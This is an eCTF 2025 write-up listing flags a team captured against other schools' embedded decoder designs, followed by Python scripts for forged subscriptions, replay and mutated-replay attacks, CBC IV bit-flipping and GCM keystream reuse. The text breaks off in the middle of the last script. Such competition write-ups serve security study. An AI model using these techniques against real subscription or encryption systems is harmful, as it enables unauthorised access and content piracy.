# writeups ectf25

Class: eCTF

# Flags Captured by School

---

## ETSU

### Expired Subscription, Pirated subscription, No Subscription

- Subscription updates were not encrypted. This allowed us to generate new subscriptions with whatever channel, timestamp, or decoder id we wanted. This attack worked to capture the expired subscription, pirated subscription, and no subscriptions flags.

[11. Generate subscriptions code](#11-generate-subscriptions-code) 

### Recording playback

- In order to get the recording playback only extra step was to stream the packets to the decoder which required an extra script.

[10. Stream frames to decoder from JSON](#10-stream-frames-to-decoder-from-json) 

### Pesky Neighbor

- The pesky neighbor attack used the same vulnerability but requires a different decoder id and script

[1. Forged Subscription Injection Attack](#1-forged-subscription-injection-attack) 

---
## CA

### Pesky Neighbor
- The decoder processed the same frame with an identical timestamp twice, violating Security Requirement 3.
  
[3. Replay Attack:](#3-replay-attack) 

### Pirated Subscription, Expired Subscription
- The system did not validate the decoder ID or timestamp fields. Subscribing with `expired.sub` or `pirated.sub` still allowed decoding of flags on channels 2 and 3.

### Recording Playback and No Subscription
- The frames were not encrypted. We extracted a frame from channel 4 and one from recording.json, converted them from hex to ASCII, and were able to recover the key.

---

## RPI


### Pesky Neighbor
- We were able to stream a frame from channel 1 and then replay a frame from channel 0 with an earlier timestamp. Both were successfully decoded, violating Security Requirement 3.
  
[2. Replay attack using 2 channels](#2-replay-attack-using-2-channels)

### Pirated Subscription
- The implementation did not check the decoder ID, allowing us to subscribe with a pirated subscription and decode frames from channel 3.

### No Subscription, Recording Playback, Expired Subscription
- The channel keys were stored as base64-encoded strings in a header file we had access to. This allowed us to decrypt frames from channels 2–4, as well as the recordings in `recording.json`.

[12. Base64 Encoded Key Attack](#12-base64-encoded-key-attack)

---
## UCF

### Recording Playback

- Used script to fuzz the bytes in the IV for the own.sub subscription payload that were XORed with the start timestamp. Allowed for the start timestamp to be lowered enough that the recorded playback frames would be decoded.

[7. Fuzzing IV to change timestamp attack](#7-fuzzing-iv-to-change-timestamp-attack) 

### Expired Subscription

- The packet was not checked for integrity, allowing modifications to the ciphertext. By doing this, we were able to change the end timestamp by brute-forcing the 44th byte in the expired subscription packet. When the value was changed to `0x11`, the decrypted end timestamp was altered such that the end time was high enough to accept incoming packets, allowing us to decode the frames and retrieve the flag.

[7. Fuzzing IV to change timestamp attack](#7-fuzzing-iv-to-change-timestamp-attack)

### Pesky Neighbor

- This part used a similar idea except for the pesky neighbor just xored the encoded frames iv with 0x01 in hopes of increasing the timestamp when the same frame was replayed. This was successful and breaks the 3rd security principle about only decoding frames with strictly monotonically increasing timestamps

[9. CBC IV XOR Attack](#9-cbc-iv-xor-attack) 

### Pirated subscription

[5. CBC IV Tampering Attack](#5-cbc-iv-tampering-attack) 

---

## USCGA

### Pirated Subscription

- Did not check the decoded id of subscription updates. This allowed the pirated.sub subscription to be accepted and the flag to be streamed.
    - flash attack board with the USCGA binary.
    - subscribe using the pirated.sub subscription which succeeds
    - start decoding frames from the pirated subscription port(xx03)

### Expired Subscription

- Did not check timestamps of frames.
    - flash attack board with the USCGA binary.
    - subscribe using the expired.sub subscription
    - start decoding frames from the pirated subscription port(xx02)

### No Subscription

- Did not check subscription of frames.
    - flash attack board with the USCGA binary.
    - start decoding frames from the pirated subscription port(xx02)

### Recording Playback

- Did not check timestamp
    - flash attack board with the USCGA binary.
    - subscribe using the own.sub subscription

[10. Stream frames to decoder from JSON](#10-stream-frames-to-decoder-from-json) 

### Pesky Neighbor

- Violated security requirement 3 by decoding same frame with same timestamp twice

[3. Replay Attack:](#3-replay-attack) 

---

## NYIT

### Recording Playback

[7. Fuzzing IV to change timestamp attack](#7-fuzzing-iv-to-change-timestamp-attack) 

### Pesky Neighbor

[3. Replay Attack:](#3-replay-attack) 

---

## ERA

### Pirated Subscription

Did not check the decoded id of subscription updates. This allowed the pirated.sub subscription to be accepted and the flag to be streamed.

- flash attack board with the ERA binary.
- subscribe using the pirated.sub subscription which succeeds
- start decoding frames from the pirated subscription port(xx03)

### Pesky Neighbor

[3. Replay Attack:](#3-replay-attack) 

---

## UTEP

### Pirated Subscription

Did not check the decoded id of subscription updates. This allowed the pirated.sub subscription to be accepted and the flag to be streamed.

- flash attack board with the UTEP binary.
- subscribe using the pirated.sub subscription which succeeds
- start decoding frames from the pirated subscription port(xx03)

### Pesky Neighbor

[3. Replay Attack:](#3-replay-attack) 

---

## CAT

### Pesky Neighbor

[3. Replay Attack:](#3-replay-attack) 

---

## UNO

### Pesky Neighbor

[3. Replay Attack:](#3-replay-attack) 

---

## MichState

### Pesky Neighbor

[3. Replay Attack:](#3-replay-attack) 

---

## Tufts

### Pesky Neighbor

[3. Replay Attack:](#3-replay-attack) 

---

## Washington

### Pesky Neighbor

[3. Replay Attack:](#3-replay-attack) 

---

## UCSC

### Pesky Neighbor

[3. Replay Attack:](#3-replay-attack) 

---

## MorganState

### Pesky Neighbor

[3. Replay Attack:](#3-replay-attack) 

---

## Parkway

### Pesky Neighbor

- A replay attack works by sending two previously captured Channel 0 frames to a neighbor's decoder. Since the timestamp isn't validated on Channel 0, the neighbor's decoder processes and displays the content, exposing the flag.

[3. Replay Attack:](#3-replay-attack) 

---

## GT1

### Pesky Neighbor

- Violated security requirement 3

[2. Replay attack using 2 channels](#2-replay-attack-using-2-channels) 

### Recording Playback

- The attack here is useful if the IV fuzzing attack fails to change the timestamp to a value in the desired range. It uses the properties of XOR and what we know about the packet to change the timestamp to an exact value.

[8. Change IV to Target a Specific Start Timestamp](#8-change-iv-to-target-a-specific-start-timestamp) 

---

## GT2

### Pesky Neighbor

- The replay attack works by sending two previously captured Channel 0 frames to a neighbor's decoder. Since the timestamp isn't validated on Channel 0, the neighbor's decoder processes and displays the content, exposing the flag.

[3. Replay Attack:](#3-replay-attack) 

---

## UCI

### Pesky Neighbor

- This attack takes advantage of improper timestamp validation across different channels. By first sending an emergency frame (on channel 0) with a very high timestamp to update the decoder’s global state, the attacker then replays a previously captured subscription frame (on channel 1) with a lower timestamp. Since the system doesn't correctly isolate or enforce timestamp order between channels

[2. Replay attack using 2 channels](#2-replay-attack-using-2-channels) 

### Pirated Subscription

[5. CBC IV Tampering Attack](#5-cbc-iv-tampering-attack) 

## UNHamp

### Pesky Neighbor

- A replay attack works by sending two previously captured Channel 0 frames to a neighbor's decoder. Since the timestamp isn't validated on Channel 0, the neighbor's decoder processes and displays the content, exposing the flag

[3. Replay Attack:](#3-replay-attack) 

### Expired Subscription, Pirated Subscription, Recorded Playback

- We were able to successfully decrypt, modify, and re-encrypt the subscription packets, as well as regenerate valid HMAC signatures. The `key_decoder_main` was stored in plaintext within a header file that we had access to. This key, along with the IV (which was included in the packet at bytes 32–47), was used for AES-CBC encryption of the subscription payload. Since both the IV and key were available to us, we could decrypt the payload, modify fields such as the start time, end time, or device ID, and then re-encrypt the data. The signature was generated using an HMAC with the `key_decoder_main` and the `device_id`, both of which were also accessible. With access to these components, we were able to re-sign the packet after making modifications, effectively spoofing valid subscription data.

[14. MITM from plaintext key attack](#14-mitm-from-plaintext-key-attack)

---

## UMass

### Pesky Neighbor

- They did not perform any security checks on channel 0. We were able to change the channel 0 payload and have it still be decoded. This allowed us to violate security requirement 2.

[4. Mutated Replay Attack](#4-mutated-replay-attack) 

---

## Purdue 2

### Pesky Neighbor

- This attack demonstrates the lack of timestamp and integrity validation on Channel 0. A previously valid frame is slightly mutated (with some bits changed) and then replayed multiple times to a neighboring decoder. Due to insufficient verification mechanisms, the decoder still accepts and decodes the altered frames, leaking sensitive information or flag

[4. Mutated Replay Attack](#4-mutated-replay-attack) 

---

## UCCS1

### Pesky Neighbor

- This attack takes advantage of improper timestamp validation across different channels. By first sending an emergency frame (on channel 0) with a very high timestamp to update the decoder’s global state, the attacker then replays a previously captured subscription frame (on channel 1) with a lower timestamp. Since the system doesn't correctly isolate or enforce timestamp order between channels

[2. Replay attack using 2 channels](#2-replay-attack-using-2-channels) 

---

## Flinders

### Pesky Neighbor

- This attack takes advantage of improper timestamp validation across different channels. By first sending an emergency frame (on channel 0) with a very high timestamp to update the decoder’s global state, the attacker then replays a previously captured subscription frame (on channel 1) with a lower timestamp. Since the system doesn't correctly isolate or enforce timestamp order between channels

[2. Replay attack using 2 channels](#2-replay-attack-using-2-channels) 

---

## Trento

### Pesky Neighbor

- This attack takes advantage of improper timestamp validation across different channels. By first sending an emergency frame (on channel 0) with a very high timestamp to update the decoder’s global state, the attacker then replays a previously captured subscription frame (on channel 1) with a lower timestamp. Since the system doesn't correctly isolate or enforce timestamp order between channels

[2. Replay attack using 2 channels](#2-replay-attack-using-2-channels) 

---

## NEU1

### Pesky Neighbor

- This attack takes advantage of improper timestamp validation across different channels. By first sending an emergency frame (on channel 0) with a very high timestamp to update the decoder’s global state, the attacker then replays a previously captured subscription frame (on channel 1) with a lower timestamp. Since the system doesn't correctly isolate or enforce timestamp order between channels

[2. Replay attack using 2 channels](#2-replay-attack-using-2-channels) 

---

## NEU2

### Expired Subscription

- The system does not validate timestamps. We subscribed to `expire.sub`, ran the `tv.run` command, and successfully retrieved the flag.

### Pirated Subscription

- They did not check decoder ID so the pirated.sub was successful allowing us to decode packets from that channel

### No Subscription

- The decoder does not verify the `decoder_id`, so we were able to create a new subscription for Channel 4, subscribe to it, and retrieve the flag.

### Recording Playback

- Timestamps are not verified, allowing access to playback without restriction.

### Pesky Neighbor

- A replay attack works by sending two captured frames from Channel 0 to a neighboring decoder. Since timestamps are not validated on Channel 0, the neighbor's decoder processes and decodes it successfully.

[3. Replay Attack:](#3-replay-attack) 

---

## SEMU

### Expired Subscription

- SEMU has hard-coded the AES key and CBC IV. We wrote a Python script that takes these values and a captured encoded frame from Channel 3 (retrieved using `nc <host> <port>`), decrypts the ciphertext, and retrieves the flag.

### Pirated Subscription

- Same as above — using the hard-coded AES key and IV, we decrypted an encoded frame from Channel 3 to recover the flag.

### No Subscription

- Using the hard-coded AES key and IV, we decrypted an encoded frame from Channel 4 (captured via netcat) to reveal the flag.

### Recording Playback

- We used the hard-coded AES key and IV with a recorded frame from Channel 1 in `recording.json` to decrypt the ciphertext and retrieve the flag.

### Pesky Neighbor

- A replay attack works by sending two previously captured frames from Channel 0 to a neighbor's decoder. As timestamps are not checked on this channel, it processes and decodes them successfully.

[3. Replay Attack:](#3-replay-attack) 

---

## OC

### Expired Subscription

- We exploited the reuse of a fixed IV (nonce) in AES-GCM mode along with a constant key shared across all channels. By performing a known-plaintext attack on a known segment of ciphertext, we extracted the keystream using XOR.
- We then applied the keystream to other encrypted data — including Channel 2 and `recording_playback.json` — to recover the expired subscription flag.

[6. XOR attack on GCM with static IV](#6-xor-attack-on-gcm-with-static-iv) 

### Pirated Subscription

- Using the same fixed IV and known key across channels, we recovered the keystream and decrypted data from Channel 3, revealing the pirated subscription flag.

[6. XOR attack on GCM with static IV](#6-xor-attack-on-gcm-with-static-iv) 

### No Subscription

- We applied the recovered keystream to ciphertext from Channel 4 to decrypt the message and extract the no-subscription flag.

[6. XOR attack on GCM with static IV](#6-xor-attack-on-gcm-with-static-iv) 

### Recording Playback

- With the keystream already recovered from the known plaintext attack, we XORed it with the `recording_playback.json` ciphertext to successfully retrieve the flag.

[6. XOR attack on GCM with static IV](#6-xor-attack-on-gcm-with-static-iv) 

---

# Attacks:

---

## 1. Forged Subscription Injection Attack

```python
import time
import sys
import struct
from binascii import unhexlify
from ectf25.utils.decoder import DecoderIntf

def create_subscription_update(decoder_id, start_timestamp, end_timestamp, channel):

    return struct.pack("<IQQI", decoder_id, start_timestamp, end_timestamp, channel)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python pesky_neighbor.py <device_path>")
        sys.exit(1)

    print("Running Pesky Neighbor attack")
    time.sleep(1)

    # Initialize interface with the neighbor decoder device
    interface = DecoderIntf(sys.argv[1])

    neighbor_decoder_id = 0xba4a575b   # change to correc decorder id
    channel = 0                        # change to correct channel

		# Change these timestamps if neeeded
    start_timestamp = 100 
    end_timestamp   = 9999999999999999

    sub_packet = create_subscription_update(neighbor_decoder_id, start_timestamp, end_timestamp, channel)
    print("[*] Sending forged subscription update for neighbor decoder on channel 2...")
    interface.subscribe(sub_packet)
    time.sleep(0.1)
https://www.notion.so/writeups-ectf25-1ce039f4beb8808d99fdc2d14e43b7a5?pvs=97#1d2039f4beb880f6a736e8f4e3aeef43
    # --- Step 2: Send a valid encoded frame on channel 2 ---

    encoded_hex = (
        "f3f38a710965585d58263c6992e3fe692d709354c0b7c82a9f1be40c899697d4b6e1b631092ca31f6ad4f01655f6f3a2d092d00a2324a402ee3c1e857d198731e95f8ebc0706bbebc84d91f541f110d24d72b2551d8bbd4d48c97ea4"
    )
    frame_bytes = bytes.fromhex(encoded_hex)

    print("[*] Sending forged decode frame on channel 2...")
    decoded_response = interface.decode(frame_bytes)
    print("Decoded frame response:", decoded_response)

    print("Done with Pesky Neighbor attack")

```

---

## 2. Replay attack using 2 channels

```python
import time
import sys

from ectf25.utils.decoder import DecoderIntf

def frame_from_hex(encoded_hex):
    """Converts a hex string into a byte frame."""
    return bytes.fromhex(encoded_hex)

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python pesky_neighbor.py <device_path>")
        sys.exit(1)

    print("Running Pesky Neighbor attack (using captured frames)")
    time.sleep(1)

    interface = DecoderIntf(sys.argv[1])
    interface.list()

    # Try using an emergency frame (channel 0) with a high timestamp to update the global state,
    # then send a subscription frame (channel 1) with a lower timestamp.

    ## sending --- hightimstamp channel 1
    emergency_hex = (
        "01000000c73c9d616d130700dba0b1316fdc7c6e9aeed0986ed898c975e35b8ef6a3293b984a5a1d8e93e1ac077a2443e00742b7258d3fdfac745f35646025af546f43eff44f2267248aa62c7ae9458d688000e6288a33d6ca124dc2ba8ca9ed4f2c92c32f4d63ede81624bdf11ebccdb1b6dd32d6acfa0e878d0d64abef5c42"
    )

    # Subscription frame from channel 1 with lower timestamp:
    ## sending lowtimestemp on channel 0
    subscription_hex = (
        "00000000145049606d130700f475298291e567117b6f8a9819975a0bf244e51043f9fc7286dbf4300536fd584e867c1f0b058cf7fe5db87f4811f2c8e8486c414a5a1cd5f505368a53d8a309b5875ecc6ec44c415d584ae92dd50072209f346889f0f1a3f4a994159dc19f57d8246f4f4d40ca18fa93628f00040d531cab1729"
    )
    # 01000000c73c9d616d130700dba0b1316fdc7c6e9aeed0986ed898c975e35b8ef6a3293b984a5a1d8e93e1ac077a2443e00742b7258d3fdfac745f35646025af546f43eff44f2267248aa62c7ae9458d688000e6288a33d6ca124dc2ba8ca9ed4f2c92c32f4d63ede81624bdf11ebccdb1b6dd32d6acfa0e878d0d64abef5c42
    emergency_frame = frame_from_hex(emergency_hex)
    subscription_frame = frame_from_hex(subscription_hex)

    try:
        print("Sending emergency frame (channel 0) to update global timestamp...")
        result_emergency = interface.decode(emergency_frame)
        print("Emergency frame result:", result_emergency)
    except Exception as e:
        print("Error sending emergency frame:", e)

    time.sleep(0.1)

    try:
        print("Sending subscription frame (channel 1) with lower timestamp...")
        result_subscription = interface.decode(subscription_frame)
        print("Subscription frame result:", result_subscription)
    except Exception as e:
        print("Error sending subscription frame:", e)

    print("Attack sequence complete.")

```

---

## 3. Replay Attack:

- This attack works on implementations that do not enforce monotonically increasing timestamps for frames on channel 0. Replaying the same frame multiple times with identical timestamps violates Security Requirement 3.
```python
import time
import sys
import os
from binascii import unhexlify

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def create_encoded_frame(channel, timestamp, encoded_hex):
    """Creates an encoded frame using channel, timestamp, and hex data."""
    # Convert hex string to bytes
    encoded_bytes = unhexlify(encoded_hex)

    # Pack channel (4 bytes) and timestamp (8 bytes)
    channel_bytes = channel.to_bytes(4, byteorder='little')
    timestamp_bytes = timestamp.to_bytes(8, byteorder='little')

    # Combine all parts
    return channel_bytes + timestamp_bytes + encoded_bytes

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python pesky_neighbor.py <device_path>")
        sys.exit(1)

    print("Running Pesky Neighbor attack")
    time.sleep(1)

    # Initialize the interface with the device path provided in argv[1]
    interface = DecoderIntf(sys.argv[1])

    # List subscriptions (simulated; for demonstration)
    interface.list()

    # Create and send two frames with specified data
    encoded = "f3f38a713303777058263c6992e3fe692d709354c0b7c82a9f1be40c899697d4b6e1b63109eee31f6ad4f01657a0f1addfffff5b2324a402ee3c1e857c4f8f3cbe5ed8bd5654b3bbcb19c5f4f98a4bcbde95d49a37af2843eda03de6"

    new_frame = bytes.fromhex(encoded)
    # Send the frame twice
    for _ in range(2):
        decoded = interface.decode(new_frame)
        print(f"Decoded frame: {decoded}")
        time.sleep(0.1)  # Small delay between frames

    print("Done with Pesky Neighbor attack")

```

---

## 4. Mutated Replay Attack

```python
import time
import sys
import os
from binascii import unhexlify

# The ectf25 module comes pre-installed in the environment
from ectf25.utils.decoder import DecoderIntf

def create_encoded_frame(channel, timestamp, encoded_hex):
    """Creates an encoded frame using channel, timestamp, and hex data."""
    # Convert hex string to bytes
    encoded_bytes = unhexlify(encoded_hex)

    # Pack channel (4 bytes) and timestamp (8 bytes)
    channel_bytes = channel.to_bytes(4, byteorder='little')
    timestamp_bytes = timestamp.to_bytes(8, byteorder='little')

    # Combine all parts
    return channel_bytes + timestamp_bytes + encoded_bytes

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python pesky_neighbor.py <device_path>")
        sys.exit(1)

    print("Running Pesky Neighbor attack")
    time.sleep(1)

    # Initialize the interface with the device path provided in argv[1]
    interface = DecoderIntf(sys.argv[1])

    # List subscriptions (simulated; for demonstration)
    interface.list()

    # get a frame from the channel 0 , and change random bits in between
    encoded = "000000004687eb15ee1bf5f84ddf86cd00000000e9a3af971c950fff40006e6f666c61676f6e746869736368ffffffff666c6167205e303030363935316339376166613365395e2074696d65205e3932306334323339303338653435eeee"

    new_frame = bytes.fromhex(encoded)
    # Send the frame twice
    for _ in range(2):
        decoded = interface.decode(new_frame)
        print(f"Decoded frame: {decoded}")
        time.sleep(0.1)  # Small delay between frames

    print("Done with Pesky Neighbor attack")

```

---

## **5. CBC IV Tampering Attack**

- This attack uses the properties of the XOR operation to change the decoder ID from the pirated decoder ID to the correct decoder ID. First, the pirated decoder ID is XORed with the correct decoder ID. The resulting value is then XORed with the first 4 bytes of the IV. The output replaces the first 4 bytes of the original IV. The final result is an update subscription packet that, when decrypted, contains the correct decoder ID.
- To change a field (here, the decoder ID) from its old value to a new one, you adjust the IV. The equation is:

$IV_{\text{new}}=IV⊕(Old\ Decoder\ ID⊕New\ Decoder\ ID)$

---

## 6. XOR attack on GCM with static IV

```python
def xor_bytes(data1: bytes, data2: bytes) -> bytes:
    
    return bytes(b1 ^ b2 for b1, b2 in zip(data1, data2))

def main():
   
   
    ciphertext_hex = "f2f38a7130998a6cd1253c6992e3fe692d709354c0b7c82a9f1be40c899697d4b6e1b631092ca31f6ad7a34656f7a7a0809ed35a2324a402ee3c1e857a48dc39b25a8ae9000fe8bc9a4a92a4528435a8702f093a3ce58f65ed45e123"
    plaintext_hex = "6e6f666c61676f6e746869736368616e5e20666c6167205e303030373435616431326434333532645e2074696d65205e35306331383030373539636137646564"
    recording_frame_hex = "02000000ee6d48f3f300b240c3bc7555776becb2ccfcabfa14fe4b37335fa6f077975785d34d336f4cd0b9a934624d5a75e20b538410ead880dc945c4549407b08658249a310188222d66354659170b1ddac021f0e87bdc38821a23c11fc3dc8f6f81453"
    recording_frame_2_hex = "f1f38a7161d6b76580253c69c9eda83c79769a5987ea95609a45b053899697d4b6e1b631092ca31f6ad7a44156a7a6ad84cad65d2324a402ee3c1e8579498f31e85a8eec0755eeea9b16c0f676ea70c8529eeb9718c601c04409af9a"

    
    ciphertext = bytes.fromhex(ciphertext_hex)
    plaintext = bytes.fromhex(plaintext_hex)
    recording_frame = bytes.fromhex(recording_frame_hex)
    recording_frame_2 = bytes.fromhex(recording_frame_2_hex)

    # Extract the frame part of the ciphertext (offset 12, 64 bytes)
    ciphertext_frame = ciphertext[12:12+64]

 
    keystream = xor_bytes(plaintext, ciphertext_frame)
    # k1 = bytes.fromhex(keystream)
    # print(k1)

    
    recording_frame_part = recording_frame[12:12+64]
    recording_frame_part_2 = recording_frame_2[12:12+64]

    flag_1 = xor_bytes(recording_frame_part, keystream)
    flag_2 = xor_bytes(recording_frame_part_2, keystream)

    
    print("Recovered Keystream (hex):", keystream.hex())
    print("Flag 1 (decoded):", flag_1.decode('utf-8', errors='ignore'))
    print("Flag 2 (decoded):", flag_2.decode('utf-8', errors='ignore'))

if __name__ == "__main__":
    main()
```

---

## 7. Fuzzing IV to change timestamp attack

Fuzzing the IV in the subscription update message allows for us to change either the start or end timestamp. This can allow us to decode the recorded playback frames as well as the expired subscription

```python
import subprocess
import sys
import tempfile
import os

def attempt_subscribe(subscription_data: bytes, com_port: str) -> bool:
    """
    Writes subscription_data to a temp file, runs
    `python -m ectf25.tv.subscribe <tempfile> <com_port>`,
    and returns True if we see "Subscribe successful" in the output (stdout/stderr).
    Otherwise returns False.
    """

    # 1) Write subscription_data to a temporary file
    with tempfile.NamedTemporaryFile(delete=False) as tmp:
        tmp_name = tmp.name
        tmp.write(subscription_data)

    # 2) Build the subscribe command
    cmd = [
        sys.executable,            # e.g. "python"
        "-m",
        "ectf25.tv.subscribe",
        tmp_name,
        com_port
    ]

    # 3) Run the command, capturing output
    proc = subprocess.run(cmd, capture_output=True, text=True)

    # 4) Clean up the temp file
    if os.path.exists(tmp_name):
        os.remove(tmp_name)

    # Check if "Subscribe successful" is in stdout or stderr
    if "Subscribe successful" in (proc.stdout + proc.stderr):
        return True
    else:
        print(proc.stdout + proc.stderr)
        return False

def get_start_time(com_port: str, channel: int = 1) -> int:
    """
    Calls `python -m ectf25.tv.list <com_port>` and extracts the start time
    for the given channel. Returns -1 on error.
    """
    import subprocess
    import sys

    cmd = [
        sys.executable,
        "-m",
        "ectf25.tv.list",
        com_port
    ]
    proc = subprocess.run(cmd, capture_output=True, text=True)

    # Process both stdout and stderr lines
    lines = proc.stdout.splitlines() + proc.stderr.splitlines()
    for line in lines:
        line = line.strip()
        # Look for the substring instead of a strict "startswith"
        if "Found subscription: Channel" in line:
            try:
                # Example line:
                # 2025-03-27 21:00:13.195 | INFO     | __main__:main:40 - Found subscription: Channel 1 1797980124284274:1991035901367881
                # We'll find where "Found subscription: Channel" begins, chop off everything before,
                # then split to parse the channel/time range.
                idx = line.index("Found subscription: Channel")
                sub_line = line[idx:]  # e.g. "Found subscription: Channel 1 1797980124284274:1991035901367881"
                parts = sub_line.split()
                # Should be ["Found", "subscription:", "Channel", "1", "1797980124284274:1991035901367881"]
                if len(parts) >= 5 and parts[3] == str(channel):
                    time_range = parts[4]
                    start_str, _ = time_range.split(":")
                    return int(start_str)
            except Exception as e:
                print(f"[!] Error parsing line: {line} -- {e}")
                return -1

    return -1  # Not found or parse error
def get_end_time(com_port: str, channel: int = 1) -> int:
    """
    Calls `python -m ectf25.tv.list <com_port>` and extracts the *end* time
    for the given channel. Returns -1 on error.
    """
    cmd = [
        sys.executable,
        "-m",
        "ectf25.tv.list",
        com_port
    ]
    proc = subprocess.run(cmd, capture_output=True, text=True)

    lines = proc.stdout.splitlines() + proc.stderr.splitlines()
    for line in lines:
        line = line.strip()
        if "Found subscription: Channel" in line:
            try:
                # Example:
                # "... Found subscription: Channel 1 1797980124284274:1991035901367881"
                idx = line.index("Found subscription: Channel")
                sub_line = line[idx:]
                parts = sub_line.split()
                # parts = ["Found", "subscription:", "Channel", "1", "1797980124284274:1991035901367881"]
                if len(parts) >= 5 and parts[3] == str(channel):
                    time_range = parts[4]
                    # (CHANGED!) Now we split out the second half as the *end* time.
                    _, end_str = time_range.split(":")
                    return int(end_str)
            except Exception as e:
                print(f"[!] Error parsing line: {line} -- {e}")
                return -1

    return -1

def main():
    """
    Usage: python subscribe_oracle.py <subscription_file> <com_port>
    Loops over tampered[13], tries subscribe, then checks if the new subscription
    has a start time < 1200000000000000.
    """
    if len(sys.argv) < 4:
        print(f"Usage: {sys.argv[0]} <subscription_file> <com_port> <bits count>")
        sys.exit(1)

    subscription_file = sys.argv[1]
    com_port = sys.argv[2]

    # 1) Load original subscription data
    with open(subscription_file, "rb") as f:
        original_data = f.read()

    # Optional: test original subscription
    print("[*] Testing original subscription data...")
    if attempt_subscribe(original_data, com_port):
        start_time = get_start_time(com_port, channel=1)
        print(f"[+] Original subscription success. Start time: {start_time}")
    else:
        print("[!] Original subscription failed.")

    bit = int(sys.argv[3])

    print(f"trying to tamper with the bit {bit}")
    # 2) Loop over all 256 possibilities for tampered[13]
    #    (assuming we only want to tweak that single byte)
    for val in range(256):
        tampered = bytearray(original_data)
        tampered[bit] = val
        tampered[bit+1] = val+1 if val+1 < 256 else 0
        print(f"[*] Trying to tamper[{bit}] = 0x{val:02X}")
        # Attempt to subscribe
        ok = attempt_subscribe(bytes(tampered), com_port)
        if not ok:
            # Subscription failed. Move on to next val
            print(f"[!] Failed to subscribe with tampered[{bit}] = 0x{val:02X}")
            continue

        # If we got here, subscribe was successful → check the subscription start time
        start_time = get_start_time(com_port, channel=1)
        end_time = get_end_time(com_port, channel=2)

        print(f"start time: {start_time}, end time: {end_time}")
        # print(f"{start_time} is the start time")
        print(f"{end_time} is the end time")
				
				# for recording playback - set start_time to timestamp from recoding.json
        # if start_time < 124077624391639  and start_time != -1:
        # for expired subscription - set end_time to recently streamed timestamp
        if end_time > 1960387337447290 and end_time != -1:
            print(f"[!!!] Found tampered[{bit}] = 0x{val:02X} with start time = {end_time}, which is > 1960430612834013")
            print("[+] Stopping search.")
            break

if __name__ == "__main__":
    main()

```

---

## 8. Change IV to Target a Specific Start Timestamp

In the subscription packet, timestamps are embedded in the AES-CBC encrypted payload. Since AES-CBC XORs each plaintext block with the previous ciphertext (or the IV for the first block), it's possible to manipulate the decrypted plaintext by directly modifying the IV

We wanted to shift the start timestamp from its original value:

- **Original start timestamp**: `1802156799701048` → Little-endian: `3830e0530d670600`
- **Target start timestamp**: `96487711901969` → Little-endian: `1109cb4bc1570000`

### Math

To calculate how to adjust the IV:

1. Compute the XOR difference between the original and desired start timestamps:
    
    ```
    XOR delta = original_start_bytes ^ target_start_bytes
              = 3830e0530d670600 ^ 1109cb4bc1570000
              = 29392b18cc300600
    
    ```
    
2. Apply this delta to **bytes 4–11** of the original IV:
    
    ```
    Original IV: 3ec8dcea71b36bece3c0cf814e6f96b4
    Modified IV: 3ec8dcea588a40f42ff0c9814e6f96b4
    
    ```
    
    This changes only the IV and is done using a hex editor
    

By feeding the modified IV into the subscription packet and re-sending it to the decoder, we were able to create a valid subscription with the desired (lower) start timestamp.

---

### Script Used

```python
import struct

# Original and target start timestamps
original_start = 1802156799701048
target_start = 96487711901969

# Convert both to little endian 8-byte representations
original_bytes = struct.pack("<Q", original_start)
target_bytes = struct.pack("<Q", target_start)

# Calculate the XOR delta between the two
delta = bytes([a ^ b for a, b in zip(original_bytes, target_bytes)])

# Modify bytes 4–11 of the IV with the delta
original_iv = bytearray.fromhex("3ec8dcea71b36bece3c0cf814e6f96b4")
for i in range(8):
    original_iv[4 + i] ^= delta[i]

# Outputs
print("Original LE:", original_bytes.hex())
print("Target LE:  ", target_bytes.hex())
print("XOR Delta:  ", delta.hex())
print("New IV:     ", original_iv.hex())

```

---

## 9. CBC IV XOR Attack

- This works for pesky neighbor by violating security requirement 3

```python
import time
import sys
from binascii import unhexlify
from ectf25.utils.decoder import DecoderIntf

def modify_iv(original_frame):
    """Modifies the first byte of IV to flip timestamp's LSB"""
    channel = original_frame[:4]
    iv = bytearray(original_frame[4:20])  # Extract IV bytes
    body = original_frame[20:]
    
    # XOR first IV byte to flip timestamp's least significant bit
    iv[0] ^= 0x01
    
    return channel + bytes(iv) + body

if __name__ == '__main__':
    if len(sys.argv) < 2:
        print("Usage: python pesky_neighbor.py <device_path>")
        sys.exit(1)

    print("Running Modified Pesky Neighbor attack")
    interface = DecoderIntf(sys.argv[1])
    
    # Original frame data
    encoded_1 = "c739e6835a15561f4c9ef49138edb95c03c1be0d89c426f7c4807b6ed4bea23d1ea46a9c057732711eb95223c783c9b23b24b7e13e484c36c8e92efd9249830d9478338cf0cf7f01089dd8c776d11848e3148de4a1f38c3238289e733757d539"
    encoded_0 = "c1ff182b3c253a55899c5798c395c6df7ed3efac71f0c217ff3d86df74f0a40df218ec109af4a439c0063e6497b8f12ed3fd9221496d79c24b43b39ca080165c7328112e9c7d8878edceba8a6d6507ec20251105eaaf61eccfdd65dffe0be040"
    # Create both frame versions
    #channel 1
    original_frame_1 = bytes.fromhex(encoded_1)
    modified_frame_1 = modify_iv(original_frame_1)
    #channel 0
    original_frame_0 = bytes.fromhex(encoded_0)
    modified_frame_0 = modify_iv(original_frame_0)
    
    # Send both frames
    try:
        
        for frame in [original_frame_1, modified_frame_1]:
            decoded = interface.decode(frame)
            print(f"Decoded frame: {decoded}")
            time.sleep(0.1)
    except:
        print("channel 1 faile!")
    
    try:
        for frame in [original_frame_0, modified_frame_0]:
            decoded = interface.decode(frame)
            print(f"Decoded frame: {decoded}")
            time.sleep(0.1)
    except:
        print("channel 0 failed!")

    print("Attack complete - check timestamp differences")


```

---

## 10. Stream frames to decoder from JSON

```python
import argparse
import binascii
import json
from loguru import logger
from ectf25.utils.decoder import DecoderIntf

class DecoderError(Exception):
    """Error thrown by the Decoder"""
    pass

class TV:
    BLOCK_LEN = 256

    def __init__(self, json_path: str, dec_port: str, dec_baud: int):
        """
        :param json_path: Path to the JSON file containing the frames
        :param dec_port: Serial port to the Decoder
        :param dec_baud: Baud rate of the Decoder serial interface
        """
        self.json_path = json_path
        self.decoder = DecoderIntf(dec_port)

    def run(self):
        """Run the TV, reading frames from the JSON file and decoding them"""
        logger.info(f"Reading frames from {self.json_path}")

        try:
